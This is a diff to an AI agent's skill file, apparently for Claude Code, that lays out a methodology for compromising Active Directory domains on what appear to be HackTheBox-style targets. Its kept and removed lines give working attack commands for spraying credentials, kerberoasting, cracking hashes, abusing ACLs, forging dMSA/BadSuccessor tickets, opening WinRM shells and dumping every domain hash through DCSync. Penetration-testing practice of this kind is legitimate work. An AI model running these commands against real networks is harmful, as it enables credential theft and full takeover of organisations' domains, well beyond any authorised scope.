@@ -9,7 +9,7 @@ Base directory for this skill: `.claude/skills/ad`
 
 Methodology for mapping an AD domain and finding the path to Domain Admin on an
 authorized target. This is the judgment layer; the tools live in `net-toolbox`
-and run at the tunnel IP via **`scripts/roo shell <cmd>`**. Recon hands off here
+and run at the tunnel IP via **`./roo shell <cmd>`**. Recon hands off here
 the moment it sees a DC profile (Kerberos 88 + LDAP 389 + SMB 445 together).
 
 ## Scope guardrail (read first)
@@ -93,7 +93,7 @@ seal and work; it's only the newer ldap3-based impacket examples that don't.
 ### The Kerberos pattern (copy this)
 
 ```bash
-scripts/roo shell sh -c '
+./roo shell sh -c '
 DC=<dc-ip>; REALM=<domain.fqdn>; USER=<user>; PASS=<pass>
 clocksync $DC                                 # whole shell now on the DC clock — no skew
 getTGT.py -dc-ip $DC "$REALM/$USER:$PASS"      # writes <user>.ccache in cwd (=/work)
@@ -117,7 +117,7 @@ image already carries the GSSAPI SASL mech + `SASL_NOCANON on`; `krbconf` sets
 `rdns=false` so the SPN is right.
 
 ```bash
-scripts/roo shell sh -c '
+./roo shell sh -c '
 DC=<dc-ip>; D=<domain.fqdn>; USER=<user>; PASS=<pass>; FQDN=DC01.$D
 krbconf $DC; clocksync $DC
 getTGT.py -dc-ip $DC "$D/$USER:$PASS"; export KRB5CCNAME=/work/$USER.ccache
@@ -142,7 +142,7 @@ land (creds that validate, a writable share, an ESC, a BloodHound path).
 ### 1. Identify the domain (unauth)
 
 ```bash
-scripts/roo shell nxc smb <dc-ip>            # domain, FQDN, OS build, signing, SMBv1
+./roo shell nxc smb <dc-ip>            # domain, FQDN, OS build, signing, SMBv1
 ```
 
 Record **NetBIOS domain, DNS domain (`*.htb`/corp), DC hostname, OS build**. Add
@@ -165,13 +165,13 @@ The moment creds validate (`[+]` from `nxc smb`), run the standard sweep:
 
 ```bash
 U=<user>; P='<pass>'; DC=<dc-ip>; D=<domain.fqdn>
-scripts/roo shell nxc smb  $DC -u $U -p $P --shares --users --pass-pol
-scripts/roo shell nxc smb  $DC -u $U -p $P -M spider_plus -o DOWNLOAD_FLAG=True OUTPUT_FOLDER=/work/loot
-scripts/roo shell nxc ldap $DC -u $U -p $P --kerberoasting kr.txt --asreproast ar.txt
-scripts/roo shell bloodyAD --host DC01.$D -d $D -u $U -p $P get writable   # ⭐ broad: every object you can write
-scripts/roo shell sh -c "cd /work && certipy find -u $U@$D -p '$P' -dc-ip $DC -ldap-scheme ldap -stdout -vulnerable"
+./roo shell nxc smb  $DC -u $U -p $P --shares --users --pass-pol
+./roo shell nxc smb  $DC -u $U -p $P -M spider_plus -o DOWNLOAD_FLAG=True OUTPUT_FOLDER=/work/loot
+./roo shell nxc ldap $DC -u $U -p $P --kerberoasting kr.txt --asreproast ar.txt
+./roo shell bloodyAD --host DC01.$D -d $D -u $U -p $P get writable   # ⭐ broad: every object you can write
+./roo shell sh -c "cd /work && certipy find -u $U@$D -p '$P' -dc-ip $DC -ldap-scheme ldap -stdout -vulnerable"
 # Full graph — try the (faster) collector, but it relies on the DC not forcing seal:
-scripts/roo shell bloodhound-ce-python -u $U -p $P -d $D -dc DC01.$D -ns $DC -c All --zip
+./roo shell bloodhound-ce-python -u $U -p $P -d $D -dc DC01.$D -ns $DC -c All --zip
 ```
 
 - **Spray every credential you hold before you crack anything.** Password reuse
@@ -201,7 +201,7 @@ scripts/roo shell bloodhound-ce-python -u $U -p $P -d $D -dc DC01.$D -ns $DC -c 
   for `rusthound-ce`/SharpHound for the full graph.
 - **Certipy** — go straight to `-ldap-scheme ldap` (the default LDAPS resets here).
 - Roasting writes hashes to `/work`; crack them on the host GPU with the **hashcat**
-  skill — `WL=$(scripts/roo wordlist); scripts/roo hashcat -m 19700 kr.txt "$WL"`
+  skill — `WL=$(./roo wordlist); ./roo hashcat -m 19700 kr.txt "$WL"`
   (spray first — see the rule above — and let the operator approve the crack).
 
 ### 4. Triage → attack paths
@@ -231,45 +231,29 @@ the enumeration pick):
 - **ACL abuse** — `GenericAll`/`WriteDACL`/`ForceChangePassword`/AddSelf/write-membership
   on a user, group, GPO, or computer (`bloodyAD set …`, `owneredit`, `rbcd`).
 - **dMSA / BadSuccessor** (Server 2025, build 26100) — a writable OU's `CreateChild`
-  + a KDS root key. Audit `nxc -M badsuccessor`, confirm the ACE + key, then see the
-  **dMSA/BadSuccessor mechanics** sub-runbook below (the operational detail bites).
+  + a KDS root key. Audit `nxc -M badsuccessor`, confirm the ACE + key, then read
+  **`runbooks/badsuccessor.md`** (the operational detail bites).
 - **DCSync** — replication rights → `secretsdump.py` for the whole domain (endgame).
 
 Keep box-specific findings (which ACE, which template, which OU) in the
 `recon-results` report — this runbook stays technique-agnostic on purpose.
 
-### dMSA / BadSuccessor mechanics (durable — the technique, not a box)
+### Technique runbooks (deep-dives — read on demand)
 
-The KDC lets a dMSA "supersede" an account and inherit its privileges. Exploiting
-it cleanly has several non-obvious gates; verify each before blaming the box:
+The phase-4 menu above is the dispatcher; durable per-technique mechanics live in
+`.claude/skills/ad/runbooks/` and are read **only** when that path is live, so this
+always-loaded skill stays lean. Cross-cutting judgment — the footgun cheat-sheet,
+the auth/sealing selector, the loopback rule — stays inline here, because it
+applies to *every* path.
 
-1. **Patched vs unpatched decides the target.** *Unpatched* (pre-Aug-2025): a
-   one-way link works — supersede a DA directly (only the dMSA-side attributes
-   matter, no rights on the victim). *Patched* (BetterSuccessor): the KDC validates
-   the link **bidirectionally**, so you must also write the victim side → you can
-   only supersede an account you have **`GenericWrite`** over. So: enumerate what you
-   can write *first*, and let that pick the target (often a service account that
-   reaches the loot, not a DA).
-2. **Create + verify the attributes** (`SharpSuccessor` on Windows, or `bloodyAD
-   add badSuccessor`). Before touching Kerberos, confirm on the dMSA:
-   `msDS-DelegatedMSAState = 2` and `msDS-ManagedAccountPrecededByLink → victim`
-   (and on a patched DC, the victim's `msDS-SupersededManagedAccountLink/State`).
-   A read as the *creator* (you may need its own ticket — the OU can deny others
-   read) settles "did the write land" vs "is the KDC refusing".
-3. **Pull the ticket — two steps, Windows, `/opsec`.** With a **current Rubeus
-   build** (verify the banner — older builds silently no-op `/dmsa`): `tgtdeleg` →
-   `asktgs /dmsa /service:krbtgt/<realm>` (the dMSA TGT) → then a **second**
-   `asktgs /dmsa /service:<spn>` for each service you want (cifs/HTTP/…). The
-   inherited PAC rides the `/dmsa`-minted *service* ticket — don't let Windows
-   auto-derive it. Keep `/opsec` (some builds NullRef without it; the "delegated
-   TGT" detour it prints is harmless).
-4. **Consume it remotely, not on the target.** See §5's loopback rule — on the DC
-   the ticket is ignored. Export the service ticket and use it from the toolbox.
-5. **Mind the ~15-min lifetime** (footgun cheat-sheet) for any large transfer.
+| Path is live | Read |
+|---|---|
+| dMSA on a Server 2025 DC (build 26100) — `nxc -M badsuccessor` flags a writable OU + KDS key | **`runbooks/badsuccessor.md`** |
 
-If the ticket issues but every access is denied, the likely cause is loopback (§5)
-or a stale Rubeus (footgun) — *not* a patched inheritance, until you've ruled those
-out from the toolbox.
+Add a runbook when a technique grows non-obvious operational detail (ADCS ESC
+chains, delegation/RBCD, DCSync edge cases are the likely next ones); keep this
+table and the phase-4 pointer in sync. Box-specific findings (which ACE, which
+template, which OU) stay in the `recon-results` report, never here.
 
 ### 5. Foothold & shells
 
@@ -292,7 +276,7 @@ itself**. It changes everything:
 
 Bridge a Windows-minted ticket (Rubeus base64 / `.kirbi`) into the toolbox:
 ```bash
-scripts/roo shell sh -c '
+./roo shell sh -c '
 DC=<dc-ip>; FQDN=DC01.<domain>; krbconf $DC; clocksync $DC
 base64 -d ticket.b64 > /tmp/t.kirbi && ticketConverter.py /tmp/t.kirbi /tmp/t.ccache
 export KRB5CCNAME=/tmp/t.ccache
@@ -302,8 +286,8 @@ smbclient.py -k -no-pass -dc-ip $DC <domain>/<dmsa>\$@$FQDN   # then: use <share
 ```
 
 ```bash
-scripts/roo shell nxc winrm $DC -u $U -p $P          # Pwn3d! ⇒ this user can WinRM
-scripts/roo shell evil-winrm -i $DC -u $U -p $P      # interactive shell
+./roo shell nxc winrm $DC -u $U -p $P          # Pwn3d! ⇒ this user can WinRM
+./roo shell evil-winrm -i $DC -u $U -p $P      # interactive shell
 ```
 
 `nxc winrm` answers "can this account get a shell" before you reach for
@@ -315,7 +299,7 @@ Kerberos-only auth. Catch reverse shells in `roo shell` with
 ### 6. Post-DA — collect
 
 ```bash
-scripts/roo shell secretsdump.py <realm>/<user>:'<pass>'@<dc>      # SAM/LSA/NTDS (DCSync)
+./roo shell secretsdump.py <realm>/<user>:'<pass>'@<dc>      # SAM/LSA/NTDS (DCSync)
 ```
 
 With DA/replication, `secretsdump` dumps NTDS (every hash → golden ticket, full
@@ -331,7 +315,7 @@ Administrator hash → PTH to the DC — not just post-DA collection.)
 
 ## Tooling reference
 
-Everything runs in `net-toolbox` at the tunnel IP via `scripts/roo shell …`:
+Everything runs in `net-toolbox` at the tunnel IP via `./roo shell …`:
 
 | Need | Tool |
 |------|------|
@@ -390,5 +374,5 @@ here; that's a tool limit, never "the data is uncollectable".
 
 Loop, don't line: every new credential — cracked, dumped, *or sprayed* — gets
 sprayed domain-wide and fed back into the sweep; every new hash or hostname feeds
-back too. Generate the final map with `scripts/roo report <dc-ip>` once buckaroos +
+back too. Generate the final map with `./roo report <dc-ip>` once buckaroos +
 AD findings are on disk.
